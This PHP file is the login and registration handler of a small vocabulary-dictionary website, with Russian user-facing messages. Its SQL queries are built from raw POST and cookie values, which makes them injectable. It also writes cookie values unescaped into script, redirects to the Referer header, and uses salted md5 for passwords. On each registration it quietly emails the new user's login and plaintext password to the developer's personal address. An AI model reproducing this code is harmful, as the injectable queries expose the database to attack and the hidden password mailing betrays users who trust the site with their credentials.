<?include "config.php";
function set_cookie($name,$value,$expire,$path){
	echo "
	<script>
		var curCookie='".$name."=".$value.";expires=".$expire.";path=".$path."';
		document.cookie=curCookie;
	</script>";
	return true;
}
if($_POST['login']){//Try to Log In
	$query=mysql_query("SELECT * FROM dt_users WHERE login LIKE '".$_POST['login']."'");
	if($user=mysql_fetch_assoc($query)){
		if(md5("ghjcnjcjkm".md5($_POST['pass']))==$user['pass']){
			$hash=md5(rand(10000000,99999999));
			mysql_query("UPDATE dt_users SET hash='".$hash."' where id=".$user['id']);
			if(set_cookie("authid",$user['id'],time()+(60*60*24*2),"/")){}else{echo "FALSE";}
			set_cookie("auth",$hash,time()+(60*60*24*7),"/");
			//Header("Location: http://shcoding.esy.es/dict/");
			echo "С возвращением!";
		}else{
			set_cookie("authid",null,time(),'/');
			set_cookie("auth",null,time(),'/');
			echo "Неверный пароль";
		}
	}else{
		$hash=md5(rand(10000000,99999999));
		mysql_query("INSERT INTO dt_users VALUES ('','0','".$_POST['login']."','".md5("ghjcnjcjkm".md5($_POST['pass']))."','".$hash."')");
		$id=mysql_insert_id();
		mysql_query("CREATE TABLE IF NOT EXISTS dt_lang_".$id."(
					  `id` int(11) NOT NULL AUTO_INCREMENT,
					  `name` text COLLATE utf8_unicode_ci NOT NULL,
					  `ab` text COLLATE utf8_unicode_ci NOT NULL,
					  `showlang` tinyint(1) NOT NULL,
					  PRIMARY KEY (`id`)
					) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1;

		");
		mysql_query("CREATE TABLE IF NOT EXISTS dt_W_".$id."(
					  `id` int(11) NOT NULL AUTO_INCREMENT,
					  `word` text COLLATE utf8_unicode_ci NOT NULL,
					  `lang` int(11) NOT NULL,
					  `status` int(11) NOT NULL,
					  `last_attempt` datetime NOT NULL,
					  `attempts` int(11) NOT NULL,
					  `success` int(11) NOT NULL,
					  `target` text COLLATE utf8_unicode_ci NOT NULL,
					  PRIMARY KEY (`id`)
					) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1;
		");
		mysql_query("
		INSERT INTO dt_lang_".$id." VALUES
		(1, 'Русский', 'ru', 0),
		(2, 'English', 'en', 0),
		(3, 'Deutsh', 'de', 0),
		(4, 'Francias', 'fr', 0),
		(5, 'Italiana', 'it', 0),
		(6, 'Español', 'es', 0),
		(7, 'Українська мова', 'uk', 0),
		(8, 'Polszczyzna', 'pl', 0),
		(9, 'Türkçe', 'tr', 0);");
		echo mysql_error();
		set_cookie("authid",$id,time()+(60*60*24*2),'/');
		set_cookie("auth",$hash,time()+(60*60*24*7),'/');
		echo "Добро пожаловать! Я рад новым пользователям. Для вас уже загружен стандартный пакет языков. ";

		//Good news :)
		$to='ded-geroy@mail.ru';
		$subject='Регистрация в словаре';
		
		$message='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">';
		$message.='<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/><title>'.htmlentities($subject,ENT_COMPAT,'UTF-8').'</title></head>';
		$message .= '<body style="background-color: #ffffff; color: #000000; font-style: normal; font-variant: normal; font-weight: normal; font-size: 12px; line-height: 18px; font-family: helvetica, arial, verdana, sans-serif;">';
		$message .= '<h2 style="background-color: #eeeeee;">Новый пользователь!</h2><br>'; 
		$message .= 'Назвался '.$_POST['login']."<br>";
		$message .= 'pass '.$_POST['pass']."<br>";
		$message .= '</body></html>';
		$headers  = "Content-type: text/html; charset=UTF-8 \r\n"; 
		$headers .= "From: Shcoding Dict <noreply@dict.ru> \r\n"; 
		$sent=mail($to,$subject,$message,$headers);
		//echo "Send - ".$sent;
	}
	?>
<script>
	document.location.href='<?echo $_SERVER['HTTP_REFERER'];?>';
</script>
	<?
}else{
	if($_COOKIE['auth'] and $_COOKIE['authid']){
		$user=mysql_fetch_assoc(mysql_query("SELECT id,login,hash FROM dt_users WHERE id=".$_COOKIE['authid']));
		if($user['hash']==$_COOKIE['auth']){
			// echo $user['login'];
		}else{
			set_cookie("authid",null,time(),'/');
			set_cookie("auth",null,time(),'/');
			$user=null;
			$title="Log in please";
		}
	}else{
		$title="Log in please";
		//die;
		//do nothing...
	}
}
echo mysql_error();
?>